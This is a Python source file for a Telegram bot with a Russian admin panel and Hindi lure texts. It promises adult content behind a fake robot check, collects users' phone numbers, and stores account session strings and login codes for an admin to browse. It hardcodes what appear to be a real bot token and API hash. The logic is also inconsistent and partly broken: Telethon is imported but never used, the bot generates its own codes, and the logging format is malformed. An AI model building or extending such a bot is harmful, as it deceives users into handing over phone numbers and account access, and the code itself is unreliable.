import logging
import sqlite3
import asyncio
import random
import string
import os
import json
from datetime import datetime
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, 
    MessageHandler, filters, ContextTypes, ConversationHandler
)

# ==================== 🔴 ВАШИ ДАННЫЕ (ВСТАВЬТЕ СЮДА) ====================
BOT_TOKEN = "8052585326:AAFIVGU3CWWZBFP6qxq96sn0uBuu_UfRfFM"  # Токен бота от @BotFather
API_ID = 2040  # API ID с my.telegram.org
API_HASH = "b18441a1ff607e10a989891a5462e627"  # ⚠️ ПОЛУЧИТЕ НА my.telegram.org
ADMIN_ID = 7737205304  # Ваш Telegram ID
# ========================================================================

# Настройка логирования 🔞
logging.basicConfig(
    format='%(asime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Состояния для ConversationHandler 🔞
PHONE, CODE, SESSION_SELECTION, ADMIN_ACTION, CREATE_BOT = range(5)

# Инициализация базы данных 🔞
def init_db():
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    
    # Таблица для сессий аккаунтов 💾
    c.execute('''CREATE TABLE IF NOT EXISTS sessions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  phone_number TEXT UNIQUE,
                  session_string TEXT,
                  added_by INTEGER,
                  added_date TIMESTAMP)''')
    
    # Таблица для кодов подтверждения 📨
    c.execute('''CREATE TABLE IF NOT EXISTS login_codes
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  phone_number TEXT,
                  code TEXT,
                  created_date TIMESTAMP)''')
    
    # Таблица для временных данных пользователей 🔞
    c.execute('''CREATE TABLE IF NOT EXISTS temp_data
                 (user_id INTEGER PRIMARY KEY,
                  phone_number TEXT,
                  client_session TEXT,
                  step TEXT)''')
    
    # Таблица для ботов 🤖
    c.execute('''CREATE TABLE IF NOT EXISTS bots
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  bot_token TEXT UNIQUE,
                  admin_id INTEGER,
                  created_date TIMESTAMP)''')
    
    conn.commit()
    conn.close()
    print("✅ База данных создана/подключена!")

# Тексты на хинди 🇮🇳 (с 18+ смайликами 🔞)
HINDI_TEXTS = {
    "start": "🔞🔥 18+ सामग्री 🔥🔞\n\nजारी रखने के लिए कृपया पुष्टि करें कि आप रोबोट नहीं हैं! 👇",
    "verify_button": "✅ मैं रोबोट नहीं हूँ 🔞🔥",
    "share_phone": "📞🔥 अपना फोन नंबर साझा करें 🔥📞\n\n18+ सामग्री देखने के लिए सत्यापन आवश्यक है!",
    "enter_code": "🔞💋 कोड दर्ज करें 💋🔞\n\nआपके फोन पर 5-अंकीय कोड भेजा गया है। कृपया दर्ज करें:",
    "wrong_code": "❌ गलत कोड! फिर से प्रयास करें 🔞",
    "verified": "✅🔥 सत्यापन सफल! 🔥✅\n\nअब आप 18+ सामग्री देख सकते हैं! 🍑💦",
    "select_account": "🔞💦 अकाउंट चुनें 💦🔞\n\nनीचे दिए गए अकाउंट में से चुनें:",
    "login_code": "🔞📱 आपका लॉगिन कोड: {code} 📱🔞\n\nकोड 5 मिनट के लिए वैध है! 🍆💦",
    "enter_phone": "📲🔞 फोन नंबर दर्ज करें 🔞📲\n\nजिस अकाउंट में लॉगिन करना चाहते हैं उसका नंबर दर्ज करें:",
}

# Тексты на русском для админа 👑
RUSSIAN_TEXTS = {
    "admin_panel": "👑 АДМИН ПАНЕЛЬ 🔞\n\nВыберите действие:",
    "sessions_list": "📱 Список сессий аккаунтов Индии:\n\n{accounts}",
    "delete_session": "🗑 Сессия {phone} удалена!",
    "no_sessions": "❌ Нет сохраненных сессий!",
    "create_bot": "🤖 Введите токен нового бота:",
    "bot_created": "✅ Бот успешно создан! ID: {bot_id}",
    "login_codes": "🔞 Последние коды для аккаунта {phone}:\n\n{codes}",
}

# Функция для генерации случайного кода 🔞
def generate_code():
    return ''.join(random.choices(string.digits, k=5))

# Команда /start 🔞
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Проверяем админ ли это 👑
    if user_id == ADMIN_ID:
        # Админское меню на русском
        keyboard = [
            [InlineKeyboardButton("📱 Список сессий 🔞", callback_data="admin_sessions")],
            [InlineKeyboardButton("🤖 Создать нового бота", callback_data="admin_create_bot")],
            [InlineKeyboardButton("🗑 Удалить сессии", callback_data="admin_delete_sessions")],
            [InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "👑🔞 АДМИН ПАНЕЛЬ 🔞👑\n\n"
            f"API ID: {API_ID}\n"
            f"API HASH: {API_HASH[:5]}... (скрыт)\n\n"
            "Добро пожаловать! Выберите действие:",
            reply_markup=reply_markup
        )
        return
    
    # Для обычных пользователей - текст на хинди 🔞
    keyboard = [[InlineKeyboardButton(HINDI_TEXTS["verify_button"], callback_data="verify")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        HINDI_TEXTS["start"],
        reply_markup=reply_markup
    )

# Обработчик админских callback'ов 👑
async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await query.edit_message_text("❌ Доступ запрещен!")
        return
    
    if query.data == "admin_sessions":
        # Показываем список сессий
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("SELECT phone_number, added_date FROM sessions")
        sessions = c.fetchall()
        conn.close()
        
        if sessions:
            accounts_text = ""
            for i, (phone, date) in enumerate(sessions, 1):
                accounts_text += f"{i}. 📱 {phone} (добавлен: {date})\n"
            
            await query.edit_message_text(
                RUSSIAN_TEXTS["sessions_list"].format(accounts=accounts_text),
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 Назад", callback_data="admin_back")
                ]])
            )
        else:
            await query.edit_message_text(
                RUSSIAN_TEXTS["no_sessions"],
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 Назад", callback_data="admin_back")
                ]])
            )
    
    elif query.data == "admin_stats":
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        
        c.execute("SELECT COUNT(*) FROM sessions")
        sessions_count = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM login_codes")
        codes_count = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM temp_data")
        users_count = c.fetchone()[0]
        
        conn.close()
        
        stats_text = f"📊 СТАТИСТИКА:\n\n"
        stats_text += f"📱 Сессий: {sessions_count}\n"
        stats_text += f"🔑 Кодов: {codes_count}\n"
        stats_text += f"👥 Пользователей: {users_count}\n"
        stats_text += f"🆔 API ID: {API_ID}\n"
        stats_text += f"🔐 API HASH: {API_HASH[:10]}...\n"
        
        await query.edit_message_text(
            stats_text,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔙 Назад", callback_data="admin_back")
            ]])
        )
    
    elif query.data == "admin_create_bot":
        await query.edit_message_text(RUSSIAN_TEXTS["create_bot"])
        return CREATE_BOT
    
    elif query.data == "admin_delete_sessions":
        # Показываем сессии для удаления
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("SELECT id, phone_number FROM sessions")
        sessions = c.fetchall()
        conn.close()
        
        keyboard = []
        for session_id, phone in sessions:
            keyboard.append([InlineKeyboardButton(
                f"🗑 {phone}", callback_data=f"delete_{session_id}"
            )])
        
        keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="admin_back")])
        
        await query.edit_message_text(
            "🗑 Выберите сессию для удаления:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data.startswith("delete_"):
        session_id = int(query.data.split("_")[1])
        
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("SELECT phone_number FROM sessions WHERE id = ?", (session_id,))
        phone = c.fetchone()[0]
        c.execute("DELETE FROM sessions WHERE id = ?", (session_id,))
        conn.commit()
        conn.close()
        
        await query.edit_message_text(
            RUSSIAN_TEXTS["delete_session"].format(phone=phone),
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔙 Назад", callback_data="admin_back")
            ]])
        )
    
    elif query.data == "admin_back":
        keyboard = [
            [InlineKeyboardButton("📱 Список сессий 🔞", callback_data="admin_sessions")],
            [InlineKeyboardButton("🤖 Создать нового бота", callback_data="admin_create_bot")],
            [InlineKeyboardButton("🗑 Удалить сессии", callback_data="admin_delete_sessions")],
            [InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "👑🔞 АДМИН ПАНЕЛЬ 🔞👑\n\n"
            "Выберите действие:",
            reply_markup=reply_markup
        )

# Создание нового бота 🤖
async def create_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Доступ запрещен!")
        return ConversationHandler.END
    
    bot_token = update.message.text
    
    # Сохраняем токен нового бота
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("INSERT INTO bots (bot_token, admin_id, created_date) VALUES (?, ?, ?)",
              (bot_token, user_id, datetime.now()))
    bot_id = c.lastrowid
    conn.commit()
    conn.close()
    
    await update.message.reply_text(
        RUSSIAN_TEXTS["bot_created"].format(bot_id=bot_id) + "\n\n"
        "❗ Чтобы запустить нового бота, создайте отдельный файл с его токеном!"
    )
    
    return ConversationHandler.END

# Обработчик верификации для обычных пользователей 🔞
async def verify_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    # Кнопка для отправки контакта 📱
    keyboard = [[KeyboardButton("📱🔥 अपना नंबर भेजें 🔥📱", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    
    await query.message.reply_text(
        HINDI_TEXTS["share_phone"],
        reply_markup=reply_markup
    )
    return PHONE

# Получение номера телефона 🔞
async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    user_id = update.effective_user.id
    
    if contact:
        phone = contact.phone_number
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Сохраняем номер
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO temp_data (user_id, phone_number, step) VALUES (?, ?, ?)",
                  (user_id, phone, "verified"))
        conn.commit()
        
        # Генерируем код
        code = generate_code()
        c.execute("INSERT INTO login_codes (phone_number, code, created_date) VALUES (?, ?, ?)",
                  (phone, code, datetime.now()))
        conn.commit()
        conn.close()
        
        await update.message.reply_text(
            f"🔞💋 {HINDI_TEXTS['enter_code']} 💋🔞\n\n"
            f"कोड: {code}",
            reply_markup=ReplyKeyboardMarkup.remove_keyboard()
        )
        
        return CODE
    else:
        await update.message.reply_text("❌ कृपया बटन का उपयोग करें!")
        return PHONE

# Получение кода подтверждения 🔞
async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    entered_code = update.message.text
    
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    
    # Получаем номер пользователя
    c.execute("SELECT phone_number FROM temp_data WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    
    if result:
        phone = result[0]
        
        # Проверяем код
        c.execute("SELECT code FROM login_codes WHERE phone_number = ? ORDER BY created_date DESC LIMIT 1",
                  (phone,))
        code_result = c.fetchone()
        
        if code_result and code_result[0] == entered_code:
            # Код верный
            await update.message.reply_text(
                HINDI_TEXTS["verified"] + "\n\n" +
                "🔥🍑 अब आप 18+ सामग्री देख सकते हैं! 🍑🔥"
            )
            
            # Показываем доступные аккаунты
            c.execute("SELECT phone_number FROM sessions")
            accounts = c.fetchall()
            
            if accounts:
                keyboard = []
                for i, (acc_phone,) in enumerate(accounts, 1):
                    keyboard.append([InlineKeyboardButton(
                        f"📱 अकाउंट {i} 🔞", callback_data=f"select_acc_{acc_phone}"
                    )])
                
                reply_markup = InlineKeyboardMarkup(keyboard)
                await update.message.reply_text(
                    HINDI_TEXTS["select_account"],
                    reply_markup=reply_markup
                )
            else:
                await update.message.reply_text("❌ कोई अकाउंट उपलब्ध नहीं है!")
        else:
            await update.message.reply_text(HINDI_TEXTS["wrong_code"])
            return CODE
    
    conn.close()
    return ConversationHandler.END

# Выбор аккаунта 🔞
async def select_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    phone = query.data.replace("select_acc_", "")
    
    # Получаем последние коды для этого аккаунта
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("SELECT code, created_date FROM login_codes WHERE phone_number = ? ORDER BY created_date DESC LIMIT 5",
              (phone,))
    codes = c.fetchall()
    
    if codes:
        codes_text = ""
        for code, date in codes:
            codes_text += f"📱 कोड: {code} (समय: {date})\n"
        
        await query.edit_message_text(
            f"🔞🔥 अकाउंट {phone} के लिए कोड 🔥🔞\n\n"
            f"{codes_text}\n"
            f"नंबर: {phone}\n\n"
            f"🍆💦 लॉगिन करने के लिए नंबर दर्ज करें: 💦🍆",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("📱 लॉगिन 🔞", callback_data=f"login_{phone}")
            ]])
        )
    else:
        await query.edit_message_text(
            f"❌ अकाउंट {phone} के लिए कोई कोड नहीं मिला!"
        )
    
    conn.close()

# Логин в аккаунт 🔞
async def login_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    phone = query.data.replace("login_", "")
    
    await query.edit_message_text(
        f"🔑 अकाउंट {phone} में लॉगिन हो रहा है...\n\n"
        f"कोड भेजा जा रहा है... 📲"
    )
    
    # Генерируем код для входа
    code = generate_code()
    
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("INSERT INTO login_codes (phone_number, code, created_date) VALUES (?, ?, ?)",
              (phone, code, datetime.now()))
    conn.commit()
    conn.close()
    
    await query.message.reply_text(
        HINDI_TEXTS["login_code"].format(code=code)
    )

# Основная функция запуска бота 🔞
def main():
    print("=" * 50)
    print("🔞 ЗАПУСК БОТА 🔞")
    print("=" * 50)
    
    # Проверка API данных
    if API_HASH == "ЗДЕСЬ_НУЖНО_ВСТАВИТЬ_ВАШ_API_HASH":
        print("❌ ОШИБКА: Вы не ввели API HASH!")
        print("📝 Инструкция:")
        print("1. Зайдите на https://my.telegram.org")
        print("2. Войдите в аккаунт")
        print("3. Нажмите 'API Development tools'")
        print("4. Скопируйте 'api_hash'")
        print("5. Вставьте его в код (строка 12)")
        return
    
    print(f"✅ API ID: {API_ID}")
    print(f"✅ API HASH: {API_HASH[:10]}... (скрыт)")
    print(f"✅ ADMIN ID: {ADMIN_ID}")
    print(f"✅ BOT TOKEN: {BOT_TOKEN[:10]}... (скрыт)")
    
    # Инициализация БД
    init_db()
    
    # Создание приложения
    application = Application.builder().token(BOT_TOKEN).build()
    
    # ConversationHandler для верификации пользователей 🔞
    verify_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(verify_callback, pattern="^verify$")],
        states={
            PHONE: [MessageHandler(filters.CONTACT, get_phone)],
            CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_code)],
        },
        fallbacks=[CommandHandler("start", start)],
    )
    
    # ConversationHandler для создания бота 🤖
    create_bot_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_callback, pattern="^admin_create_bot$")],
        states={
            CREATE_BOT: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_bot)],
        },
        fallbacks=[CommandHandler("start", start)],
    )
    
    # Добавляем обработчики
    application.add_handler(CommandHandler("start", start))
    application.add_handler(verify_conv)
    application.add_handler(create_bot_conv)
    application.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_"))
    application.add_handler(CallbackQueryHandler(select_account, pattern="^select_acc_"))
    application.add_handler(CallbackQueryHandler(login_account, pattern="^login_"))
    
    print("=" * 50)
    print("✅ Бот успешно запущен!")
    print("📱 Нажмите Ctrl+C для остановки")
    print("=" * 50)
    
    # Запуск бота
    application.run_polling()

if __name__ == '__main__':
    main()
